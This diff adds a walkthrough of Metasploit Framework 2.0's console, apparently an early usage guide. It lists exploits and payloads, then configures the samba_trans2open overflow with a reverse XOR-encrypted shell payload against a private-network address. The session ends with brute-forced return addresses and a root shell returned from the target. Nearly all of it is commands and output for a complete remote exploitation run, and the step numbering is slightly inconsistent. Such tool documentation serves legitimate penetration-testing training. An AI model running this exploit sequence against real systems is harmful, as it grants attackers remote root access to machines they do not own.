@@ -1,0 +1,171 @@
+1) Start up the console
+
+hdm@ice framework-v2.0 $ ./msfconsole
+msfconsole: load: loaded configuration from /home/hdm/.msfconsole
+
++ -- --=[ msfconsole v2.0 [12 exploits - 16 payloads]
+
+msf > 
+
+
+2) Show available exploits
+
+msf > show exploits
+
+Metasploit Framework Loaded Exploits
+====================================
+
+  apache_chunked_win32          Apache Win32 Chunked Encoding
+  exchange2000_xexch50          Exchange 2000 MS03-46 Heap Overflow
+  frontpage_fp30reg_chunked     Frontpage fp30reg.dll Chunked Encoding
+  iis50_nsiislog_post           IIS 5.0 nsiislog.dll POST Overflow
+  iis50_printer_overflow        IIS 5.0 Printer Buffer Overflow
+  iis50_webdav_ntdll            IIS 5.0 WebDAV ntdll.dll Overflow
+  msrpc_dcom_ms03_026_win2kxp   Microsoft RPC DCOM MSO3-026 NT 2K/XP
+  msrpc_dcom_ms03_026_winnt     Microsoft RPC DCOM MSO3-026 NT 4.0
+  mssql2000_resolution          MSSQL 2000 Resolution Overflow
+  samba_trans2open              Samba trans2open Overflow
+  solaris_sadmind_exec          Solaris sadmind Remote Exec
+  warftpd_165_pass              War-FTPD 1.65 PASS Overflow
+
+
+3) Show available payloads
+
+msf > show payloads 
+
+Metasploit Framework Loaded Payloads
+====================================
+
+  bsdx86bind                    Listen for connection and spawn a shell
+  bsdx86bind_lsd                Listen for connection and spawn a shell
+  bsdx86findsock                Spawn a shell on the established connection
+  bsdx86reverse                 Connect back to attacker and spawn a shell
+  linx86bind                    Listen for connection and spawn a shell
+  linx86findsock                Spawn a shell on the established connection
+  linx86reverse                 Connect back to attacker and spawn a shell
+  linx86reverse_ie              Connect back to attacker and spawn a shell
+  linx86reverse_imp             Connect back to attacker and download impurity module
+  linx86reverse_xor_ie          Connect back to attacker and spawn an encrypted shell
+  solx86bind                    Listen for connection and spawn a shell
+  solx86findsock                Spawn a shell on the established connection
+  solx86reverse                 Connect back to attacker and spawn a shell
+  winadduser                    Create admin user X with pass X
+  winbind                       Listen for connection and spawn a shell
+  winreverse                    Connect back to attacker and spawn a shell
+
+
+5) Show current configuration
+
+msf > show config
+
+Metasploit Framework Configuration
+====================================
+
+  CONFDIR                       /home/hdm/.msfconsole
+  LOGGING                       1
+
+
+6) Enable or disable logging
+
+msf > logging on
+msfconsole: logging: logging has been enabled
+
+
+7) Select your favorite exploits
+
+msf > use samba_trans2open 
+msf samba_trans2open > 
+
+
+8) Show available targets for this exploit
+
+msf samba_trans2open > show targets 
+
+Supported Exploit Targets
+=========================
+
+  0     Linux x86
+  1     FreeBSD x86
+
+
+9) Select the appropriate target value
+
+msf samba_trans2open > set TARGET 0
+TARGET: 0
+
+
+10) Show payloads that work with this exploit
+msf samba_trans2open > show payloads 
+
+Metasploit Framework Usable Payloads
+====================================
+
+  bsdx86bind                    Listen for connection and spawn a shell
+  bsdx86bind_lsd                Listen for connection and spawn a shell
+  bsdx86findsock                Spawn a shell on the established connection
+  bsdx86reverse                 Connect back to attacker and spawn a shell
+  linx86bind                    Listen for connection and spawn a shell
+  linx86findsock                Spawn a shell on the established connection
+  linx86reverse                 Connect back to attacker and spawn a shell
+  linx86reverse_ie              Connect back to attacker and spawn a shell
+  linx86reverse_imp             Connect back to attacker and download impurity module
+  linx86reverse_xor_ie          Connect back to attacker and spawn an encrypted shell
+
+
+11) Select an appropriate payload for the target
+
+msf samba_trans2open > set PAYLOAD linx86reverse_xor_ie 
+PAYLOAD: linx86reverse_xor_ie
+
+
+12) Show available options
+
+msf samba_trans2open > show options 
+
+Exploit and Payload Options
+============================
+
+  required:             RHOST          The target address
+  required:             RPORT          The samba port
+
+  required:             LHOST          Local address to receive connection
+  required:             LPORT          Local port to receive connection
+  required:             XKEY           Byte to xor the connection with
+
+
+
+13) Set all required options
+
+msf samba_trans2open > set RHOST 192.168.0.100  
+RHOST: 192.168.0.100
+msf samba_trans2open > set RPORT 139 
+RPORT: 139
+msf samba_trans2open > set LHOST 192.168.0.247 
+LHOST: 192.168.0.247
+msf samba_trans2open > set LPORT 34334
+LPORT: 34334
+msf samba_trans2open > set XKEY 34
+XKEY: 34
+
+
+12) Perform a vulnerability check
+
+msf samba_trans2open > check
+msfconsole: check: No check has been implemented for this module
+
+
+13) Launch the actual exploit (finally) :)
+
+msf samba_trans2open > exploit
+msfconsole: exploit: starting handler reverse_shell_xor
+[*] Starting brute force mode...
+[*] Trying return address 0xbfffffdc
+[*] Trying return address 0xbffffddc
+[*] Trying return address 0xbffffbdc
+[*] Trying return address 0xbffff9dc
+[*] Trying return address 0xbffff7dc
+[*] Trying return address 0xbffff5dc
+[*] Connection from 192.168.0.100:1064...
+
+sh: no job control in this shell
+sh-2.04# 
